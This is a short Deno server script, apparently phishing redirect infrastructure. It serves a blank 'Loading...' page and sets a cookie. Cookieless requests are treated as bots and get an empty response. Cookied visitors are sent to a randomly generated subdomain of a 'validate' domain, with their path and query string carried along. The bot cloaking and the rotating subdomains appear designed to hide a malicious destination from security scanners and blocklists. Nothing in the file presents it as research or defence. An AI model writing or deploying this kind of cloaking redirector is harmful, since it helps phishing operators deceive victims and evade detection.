Deno.serve({ port: 8080 }, (request: Request): Response => {
  try {
    const url = new URL(request.url);
    const cookies = request.headers.get('cookie') || '';
    
    // Check if this is a script request (ends with .js)
    if (url.pathname.endsWith('.js')) {
      // No cookie = bot, return empty response
      if (!cookies.includes('_v=1')) {
        return new Response('', { status: 204 });
      }

      const currentPath = url.searchParams.get('p') || '/';
      const queryString = url.searchParams.get('q') || '';

      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let sub = '';
      for (let i = 0; i < 5; i++) {
        sub += chars.charAt(Math.floor(Math.random() * chars.length));
      }

      const destination = `https://details${sub}.validate.equiteq.org${currentPath}?q=a${queryString ? '&' + queryString : ''}`;

      const js = `window.location.replace('${destination}');`;

      return new Response(js, {
        headers: { 
          'Content-Type': 'application/javascript',
          'Cache-Control': 'no-store'
        }
      });
    }

    // Generate random script filename
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomName = '';
    for (let i = 0; i < 8; i++) {
      randomName += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    const scriptUrl = `/${randomName}.js?p=${encodeURIComponent(url.pathname)}&q=${encodeURIComponent(url.search.substring(1))}`;

    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
</head>
<body>
  <script src="${scriptUrl}"></script>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
        'Set-Cookie': '_v=1; Path=/; HttpOnly; SameSite=Strict; Max-Age=60'
      }
    });

  } catch (error) {
    console.error('Error:', error);
    return new Response('Error', { status: 500 });
  }
});
